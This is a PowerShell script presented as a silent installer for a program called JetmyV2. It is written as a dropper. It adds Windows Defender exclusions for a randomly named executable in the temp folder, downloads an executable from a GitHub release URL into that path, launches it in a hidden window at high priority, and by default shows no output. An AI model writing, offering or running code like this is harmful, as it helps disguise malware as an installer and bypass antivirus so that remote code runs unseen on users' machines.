$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

# Set to $true to show diagnostics. Leave $false for a silent installation.
$Debug = $false

function Write-InstallerLog {
    param([string]$Message)

    if ($Debug) {
        Write-Host ('[installer] {0}' -f $Message)
    }
}

$DownloadUrl = "https://github.com/enderhacker/JetmyV2/releases/latest/download/JetmyV2.exe"

$webClient = $null
$exitCode = 1
$stage = 'initialization'
try {
    Write-InstallerLog ('PowerShell: {0}; .NET: {1}; Windows: {2}' -f $PSVersionTable.PSVersion, [Environment]::Version, [Environment]::OSVersion.VersionString)
    Write-InstallerLog ('Process architecture: {0}; native architecture override: {1}' -f $env:PROCESSOR_ARCHITECTURE, $env:PROCESSOR_ARCHITEW6432)
    $TempExePath = Join-Path $env:TEMP ([IO.Path]::ChangeExtension([IO.Path]::GetRandomFileName(), '.exe'))

    Write-InstallerLog ('Temporary executable: {0}' -f $TempExePath)

    $stage = 'TLS configuration'
    try {
        # 3072 representa TLS 1.2 como entero; evita fallos de tipo en Windows 7/.NET anterior a 4.5
        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072
        Write-InstallerLog 'TLS 1.2 enabled.'
    } catch {
        Write-InstallerLog ('Could not enable TLS 1.2; keeping system defaults: {0}' -f $_.Exception.Message)
    }

    try {
        # Only attempt if the cmdlet exists (Windows 8+ with Defender)
        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
            Add-MpPreference -ExclusionPath $TempExePath -Force -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess $TempExePath -Force -ErrorAction SilentlyContinue
            Write-InstallerLog 'Defender exclusions added (best-effort).'
        } else {
            Write-InstallerLog 'Add-MpPreference not available; skipping Defender exclusions.'
        }
    } catch {
        Write-InstallerLog ('Could not set Defender exclusions: {0}' -f $_.Exception.Message)
    }

    $stage = 'download'
    Write-InstallerLog ('Downloading: {0}' -f $DownloadUrl)
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($DownloadUrl, $TempExePath)

    $stage = 'download verification'
    if (-not (Test-Path -LiteralPath $TempExePath -PathType Leaf)) {
        throw 'The download did not create an executable file.'
    }
    $download = Get-Item -LiteralPath $TempExePath
    Write-InstallerLog ('Downloaded {0} bytes.' -f $download.Length)

    $stage = 'process launch'
    Write-InstallerLog 'Starting downloaded executable (hidden); exiting PowerShell without waiting.'
    
    $process = Start-Process -FilePath $TempExePath -WindowStyle Hidden -PassThru

    if ($null -ne $process) {
        try {
            $process.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
            Write-InstallerLog 'Process priority successfully set to High.'
        } catch {
            Write-InstallerLog ('Could not set process priority (requires elevated privileges): {0}' -f $_.Exception.Message)
        }
    }

    $exitCode = 0
}
catch {
    Write-InstallerLog ('Failed during {0}: {1}' -f $stage, $_.Exception.Message)
    Write-InstallerLog ('Error ID: {0}; category: {1}' -f $_.FullyQualifiedErrorId, $_.CategoryInfo)
    Write-InstallerLog ('Location: {0}' -f $_.InvocationInfo.PositionMessage)
    $exception = $_.Exception.InnerException
    while ($null -ne $exception) {
        Write-InstallerLog ('Inner exception ({0}): {1}' -f $exception.GetType().FullName, $exception.Message)
        $exception = $exception.InnerException
    }
}
finally {
    if ($null -ne $webClient) {
        try {
            $webClient.Dispose()
        } catch {
            Write-InstallerLog ('WebClient cleanup failed: {0}' -f $_.Exception.Message)
        }
    }
}

exit $exitCode